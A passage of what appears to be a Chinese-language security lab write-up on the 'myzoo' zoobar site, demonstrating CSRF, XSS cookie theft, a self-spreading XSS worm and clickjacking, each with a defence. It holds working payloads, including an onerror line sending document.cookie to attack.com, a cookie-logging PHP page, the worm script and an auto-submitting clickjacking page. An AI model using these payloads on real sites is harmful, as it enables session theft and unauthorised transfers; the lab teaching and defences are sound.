<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.attack.com&quot;</span>&gt;</span> 点击查看我的照片哦<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后点击save。</p>
<p>2.在10.211.55.14上登录victim账户，victim用户去查看csrfattack的profile</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234357.png" alt="截屏2021-01-05 上午4.06.02"></p>
<p>当victim点击该链接后，就会向csrfattack转1个zoobars。</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="方法1-使用session"><a href="#方法1-使用session" class="headerlink" title="方法1:使用session"></a>方法1:使用session</h4><p>修改transfer.php文件：</p>
<p>1.在开头加入下面的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.修改if语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>3.在45-47行加入下面内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>4.在form中添加下面的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input type=hidden name=token value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf&#x27;]?&gt;&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>修改后的transfer.php如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&quot;includes/common.php&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">nav_start_outer</span>(<span class="string">&quot;Transfer&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">nav_start_inner</span>();</span><br><span class="line"> <span class="comment">//if($_POST[&#x27;submission&#x27;]) &#123;</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>]) &#123;</span><br><span class="line"> <span class="comment">//if($_POST[&#x27;submission&#x27;] &amp;&amp; $_SERVER[&#x27;HTTP_REFERER&#x27;] == &quot;http://www.myzoo.com/transfer.php&quot;) &#123;</span></span><br><span class="line">	    <span class="variable">$recipient</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;recipient&#x27;</span>];</span><br><span class="line">    <span class="variable">$zoobars</span> = (<span class="keyword">int</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;zoobars&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$sender_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] - <span class="variable">$zoobars</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT PersonID FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$recipient_exists</span> = <span class="variable">$rs</span>[<span class="string">&quot;PersonID&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$zoobars</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$sender_balance</span> &gt;= <span class="number">0</span> &amp;&amp; <span class="variable">$recipient_exists</span>) &#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$sender_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">      <span class="variable">$recipient_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] + <span class="variable">$zoobars</span>;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$recipient_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$result</span> = <span class="string">&quot;Sent <span class="subst">$zoobars</span> zoobars&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$result</span> = <span class="string">&quot;Transfer to <span class="subst">$recipient</span> failed.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;&lt;b&gt;Balance:&lt;/b&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;myZoobars&quot;</span>&gt;  <span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">  <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">  <span class="variable">$balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$balance</span> &gt; <span class="number">0</span> ? <span class="variable">$balance</span> : <span class="number">0</span>;</span><br><span class="line"><span class="meta">?&gt;</span> &lt;/span&gt; zoobars&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form method=POST name=transferform</span><br><span class="line">  action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;Send &lt;input name=zoobars type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;zoobars&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span> size=<span class="number">5</span>&gt; zoobars&lt;/p&gt;</span><br><span class="line">&lt;p&gt;to &lt;input name=recipient type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;recipient&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;input type=hidden name=token value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf&#x27;]?&gt;&quot;</span>/&gt;</span><br><span class="line">&lt;input type=submit name=submission value=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;span <span class="class"><span class="keyword">class</span>=<span class="title">warning</span>&gt;&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">echo</span> &quot;$<span class="title">result</span>&quot;; </span></span><br><span class="line"><span class="class">?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">nav_end_inner</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">javascript</span>&quot; <span class="title">src</span>=&quot;<span class="title">zoobars</span>.<span class="title">js</span>.<span class="title">php</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">  <span class="title">nav_end_outer</span>(); </span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法2-验证HTTP-Referer"><a href="#方法2-验证HTTP-Referer" class="headerlink" title="方法2:验证HTTP Referer"></a>方法2:验证HTTP Referer</h4><p>修改transfer.php文件：</p>
<p>1.修改if语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] == <span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>在zoobar网站上展示并防御XSS攻击。请注意实现cookie窃取、以及xss蠕虫。</p>
<p>如果不修改myzoo&#x2F;user.php源码，很难实现XSS攻击</p>
<p>修改 myzoo&#x2F;user.php源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$allowed_tags</span> = </span><br><span class="line">      <span class="string">&#x27;&lt;script&gt;&lt;a&gt;&lt;br&gt;&lt;b&gt;&lt;h1&gt;&lt;h2&gt;&lt;h3&gt;&lt;h4&gt;&lt;i&gt;&lt;img&gt;&lt;li&gt;&lt;ol&gt;&lt;p&gt;&lt;strong&gt;&lt;table&gt;&#x27;</span> .</span><br><span class="line">      <span class="string">&#x27;&lt;tr&gt;&lt;td&gt;&lt;th&gt;&lt;u&gt;&lt;ul&gt;&lt;em&gt;&lt;span&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$disallowed</span> = </span><br><span class="line">  <span class="string">&#x27;eval|setTimeout|setInterval|target|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onAbort|onBlur|onChange|onClick|onDblClick|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onDragDrop|onFocus|onKeyDown|onKeyPress|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onKeyUp|onLoad|onMouseDown|onMouseMove|onMouseOut|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onMouseOver|onMouseUp|onMove|onReset|onResize|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onSelect|onSubmit|onUnload&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h3 id="cookie窃取"><a href="#cookie窃取" class="headerlink" title="cookie窃取"></a>cookie窃取</h3><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>在myzoo网站创建账号xssattack。</p>
<p>攻击者虚拟机配置（10.211.55.16）</p>
<p>1.创建xss.php文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /var/www/html/xss.php</span><br></pre></td></tr></table></figure>

<p>将下面的内容复制进去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cookie</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;get cookie: &#x27;</span>.<span class="variable">$cookie</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;not get cookie&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><p>修改xssattack账号的profile</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=x onerror=javascript:window.<span class="built_in">open</span>(<span class="string">&quot;http://www.attack.com/xss.php?cookie=&quot;</span>+document.cookie) /&gt;</span><br></pre></td></tr></table></figure>

<p>用户victim访问xssattack，就会弹出一个页面里面会打印获取到的cookie值。</p>
<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><h5 id="方法一-设置httponly"><a href="#方法一-设置httponly" class="headerlink" title="方法一:设置httponly"></a>方法一:设置httponly</h5><p>如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性。</p>
<p>1.修改auth.php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// setcookie($this-&gt;cookieName, $cookieData, time() + 31104000);</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="variable language_">$this</span>-&gt;cookieName, <span class="variable">$cookieData</span>, <span class="title function_ invoke__">time</span>() + <span class="number">31104000</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<h5 id="方法二-禁用标签"><a href="#方法二-禁用标签" class="headerlink" title="方法二:禁用标签"></a>方法二:禁用标签</h5><h3 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h3><h4 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h4><p>进行这个攻击前需要把csrf的的防御给去掉。</p>
<p>注册账号xssattack1</p>
<p>修改xssattack1的profile</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;hack&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span>,<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">send</span>(<span class="string">&quot;zoobars=1&amp;recipient=xssattack1&amp;submission=Send&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://www.myzoo.com/index.php&quot;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        str = <span class="string">&quot;&lt;span id=hack&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">        str += <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;hack&quot;</span>).<span class="property">innerHTML</span> + <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        str = <span class="built_in">encodeURIComponent</span>(str);</span></span><br><span class="line"><span class="language-javascript">        str = <span class="string">&quot;profile_submit=Save&amp;profile_update=&quot;</span> + str;</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">send</span>(str);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当其他用户访问xssattack1时，就会给xssattack1转1个zoobars，并且复制xssattack1的profile复制到自己的profile。</p>
<h4 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4><h5 id="方法1-输入过滤"><a href="#方法1-输入过滤" class="headerlink" title="方法1:输入过滤"></a>方法1:输入过滤</h5><p>输入过滤比较好理解，可以通过设置白名单或者黑名单，将一些可能造成攻击的标签都过滤；</p>
<h5 id="方法2-输出转义"><a href="#方法2-输出转义" class="headerlink" title="方法2:输出转义"></a>方法2:输出转义</h5><p>输出转义，主要是因为输入的恶意代码，如果保存在网站的数据库中，最终都是有一个输出的过程然后才能获得执行。那么就在从数据库取出，并展示在网页之前，对所有的内容进行转义。PHP中htmlentities() 函数把字符转换为 HTML 实体。HTML实体（character entities）的目的是正确地显示预留字符，譬如如果想要在网页上输出&lt;br&gt;，如果直接在HTML中写&lt;br&gt;，浏览器会自动将它当做代码，而不是字符串，此时就需要，将&lt;和&gt;转换为实体，也即&amp;lt; 或 &amp;#60。也即，通过htmlentities，所有的攻击代码，不管怎么构造的，都会被变成普通的字符，而不会造成攻击效果。</p>
<p>修改users.php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$profile</span>, <span class="variable">$allowed_tags</span>);</span><br><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$profile</span>); <span class="comment">//在users.php中加入这行代码即可</span></span><br></pre></td></tr></table></figure>

<h2 id="Click-Jacking"><a href="#Click-Jacking" class="headerlink" title="Click Jacking"></a>Click Jacking</h2><p>在zoobar网站上展示并防御点击劫持攻击；或者在其他网站上实现点击劫持攻击。</p>
<p>结合csrf的clickjacking版本</p>
<h3 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h3><p>在myzoo网站上注册clickjacking账号</p>
<p>攻击者虚拟机配置(10.211.55.16)</p>
<p>1.创建clickjacking.html</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /var/www/html/clickjacking.html</span><br></pre></td></tr></table></figure>

<p>将以下内容复制进去</p>
<p>Clickjacking.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">iframe</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">1440px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">900px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: -<span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: -<span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#clickjacking</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">294px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">584px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;it&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">name</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">action</span>=<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">target</span>=<span class="string">&quot;it&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">id</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;zoobars&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;recipient&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;clickjacking&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submission&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;clickjacking&quot;</span> <span class="attr">value</span>=<span class="string">&quot;WIN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;transferform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>myzoo网站修改transfer.php</p>
<p>Transfer.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&quot;includes/common.php&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">nav_start_outer</span>(<span class="string">&quot;Transfer&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">nav_start_inner</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// if($_POST[&#x27;submission&#x27;]) &#123;</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>]) &#123; </span><br><span class="line"> <span class="comment">//  if($_POST[&#x27;submission&#x27;] &amp;&amp; $_SERVER[&#x27;HTTP_REFERER&#x27;] == &quot;http://www.myzoo.com/transfer.php&quot;) &#123;</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">	 <span class="variable">$recipient</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;recipient&#x27;</span>];</span><br><span class="line">    <span class="variable">$zoobars</span> = (<span class="keyword">int</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;zoobars&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$sender_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] - <span class="variable">$zoobars</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT PersonID FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$recipient_exists</span> = <span class="variable">$rs</span>[<span class="string">&quot;PersonID&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$zoobars</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$sender_balance</span> &gt;= <span class="number">0</span> &amp;&amp; <span class="variable">$recipient_exists</span>) &#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$sender_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$rs</span> = <span 